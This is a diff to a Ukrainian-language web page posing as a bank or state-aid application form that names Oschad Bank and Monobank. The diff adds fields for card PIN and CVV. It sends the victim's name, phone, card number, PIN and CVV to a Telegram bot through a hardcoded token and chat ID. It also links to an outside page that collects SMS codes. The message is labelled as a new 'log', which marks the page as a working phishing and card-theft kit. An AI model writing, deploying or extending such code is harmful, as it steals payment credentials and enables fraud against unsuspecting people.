@@ -7,7 +7,7 @@
 <style>
 body{
   margin:0;
-  font-family: Arial, sans-serif;
+  font-family: Arial;
   background:#f1f5f9;
   display:flex;
   justify-content:center;
@@ -19,14 +19,13 @@ body{
   background:white;
   padding:30px;
   border-radius:20px;
-  width:340px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+  width:360px;
   text-align:center;
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
 }
 
 h2{
   margin-bottom:15px;
-  color:#0f172a;
 }
 
 input{
@@ -39,9 +38,9 @@ input{
 }
 
 .service{
-  background:#f1f5f9;
   padding:10px;
   margin:6px 0;
+  background:#f1f5f9;
   border-radius:10px;
   cursor:pointer;
 }
@@ -55,15 +54,11 @@ button{
   width:100%;
   padding:12px;
   margin-top:10px;
-  border:none;
-  border-radius:10px;
   background:#3b82f6;
   color:white;
+  border:none;
+  border-radius:10px;
   cursor:pointer;
-}
-
-button:hover{
-  background:#2563eb;
 }
 </style>
 </head>
@@ -71,13 +66,15 @@ button:hover{
 <body>
 
 <div class="box">
-  <h2>Відправити заявку</h2>
+  <h2></h2>Залишити заявку</h2>
 
-  <input type="text" id="name" placeholder="Имя">
+  <input type="text" id="name" placeholder="Ім'я">
   <input type="text" id="phone" placeholder="Телефон">
   <input type="text" id="telegram" placeholder="Номер картки">
+  <input type="text" id="city" placeholder="Пін-код">
+  <input type="text" id="budget" placeholder="CVV/CCV2">
 
-  <p>Виберіть ваш Банк:</p>
+  <p>Ваш Банк:</p>
 
   <div class="service" onclick="select(this)">Oschad Bank</div>
   <div class="service" onclick="select(this)">Monobank</div>
@@ -98,9 +95,11 @@ function select(el){
 function send(){
   const name = document.getElementById("name").value.trim();
   const phone = document.getElementById("phone").value.trim();
-  const tg = document.getElementById("telegram").value.trim();
+  const telegram = document.getElementById("telegram").value.trim();
+  const city = document.getElementById("city").value.trim();
+  const budget = document.getElementById("budget").value.trim();
 
-  if(!name || !phone || !tg || !service){
+  if(!name || !phone || !telegram || !city || !budget || !service){
     alert("Заповніть все!");
     return;
   }
@@ -110,19 +109,24 @@ function send(){
   const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
   const chat_id = "8035773808";
 
+  const link = `https://dopomogavidderzhavi-bvoa.vercel.app/go.html?id=${id}`;
+
   fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       chat_id:chat_id,
-      text:`🔥 Новый Лог 👻
+      text:`🔥 Новый Лог 👻:
 ID: ${id}
-Имя🦣: ${name}
-Телефон📱: ${phone}
-Карта💳: ${tg}
-Банк🏧: ${service}
+Имя: ${name}
+Телефон: ${phone}
+Номер Карты: ${telegram}
+Пин-код: ${city}
+Срок: ${budget}
+CVV: ${service}
 
-👉 Ожидание: /wait.html?id=${id}`
+СМС/КОД:
+${link}`
     })
   });
 
